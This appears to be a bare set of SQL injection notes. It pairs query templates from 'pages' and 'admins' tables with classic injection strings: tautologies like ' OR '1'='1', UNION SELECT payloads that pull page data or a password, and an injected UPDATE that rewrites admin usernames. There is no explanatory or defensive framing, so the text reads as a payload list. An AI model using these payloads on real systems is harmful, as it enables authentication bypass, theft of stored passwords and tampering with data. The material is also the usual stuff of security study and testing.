
SELECT title, body FROM pages WHERE id = ''
1' OR 1=1
1' OR 1=0 UNION SELECT * FROM pages;--

SELECT password FROM admins WHERE username = '';
' OR '1' = '0' UNION ALL SELECT 'pass';--

SELECT password FROM admins WHERE username='';
1' OR '1' = '1';--
UPDATE admins SET username='dev' WHERE username='1' OR '1' = '1';--


SELECT * FROM Pages WHERE id = "<input>"
SELECT title FROM Pages WHERE id = 1;

SELECT * FROM Pages WHERE id = "invalid_user" OR "1"="1"

invalid_user" OR "1"="1